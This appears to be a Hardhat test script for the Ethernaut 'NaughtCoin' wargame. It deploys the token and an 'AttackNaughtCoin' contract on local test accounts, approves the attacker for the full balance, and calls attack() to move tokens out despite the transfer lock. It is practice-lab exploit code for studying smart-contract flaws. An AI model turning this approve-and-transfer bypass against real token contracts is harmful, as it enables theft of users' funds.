const {ethers} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const accounts = await ethers.getSigners();
    const baseContractFactory = await hre.ethers.getContractFactory('NaughtCoin');

    const naughtCoinContract = await baseContractFactory.connect(accounts[1]).deploy(accounts[1].address);
    await naughtCoinContract.deployed();


    console.log(naughtCoinContract.address);
    // await naughtCoinContract.balanceOf(accounts[0].address);
    console.log(parseInt((await naughtCoinContract.balanceOf(accounts[1].address)), 10));
    console.log(parseInt((await naughtCoinContract.balanceOf(accounts[2].address)), 10));


    const attackContractFactory = await hre.ethers.getContractFactory('AttackNaughtCoin');
    const attackTokenContract = await attackContractFactory.connect(accounts[2]).deploy(naughtCoinContract.address.toString());
    //
    //
    await attackTokenContract.deployed();
    //
    // console.log(parseInt((await tokenContract.balanceOf(accounts[2].address)).toString(), 10));
    console.log(attackTokenContract.address);
    await naughtCoinContract.approve(attackTokenContract.address, "1000000000000000000000000");
    console.log(accounts[1].address);
    const tnx = await attackTokenContract.connect(accounts[1]).attack(accounts[2].address);
    // const tnx = await naughtCoinContract.connect(accounts[1]).transfer(accounts[2].address,100);
    await tnx.wait();
    // console.log(parseInt((await tokenContract.balanceOf(accounts[2].address)).toString(), 10));
    console.log(parseInt((await naughtCoinContract.balanceOf(accounts[1].address)), 10));
    console.log(parseInt((await naughtCoinContract.balanceOf(accounts[2].address)), 10));




}

main();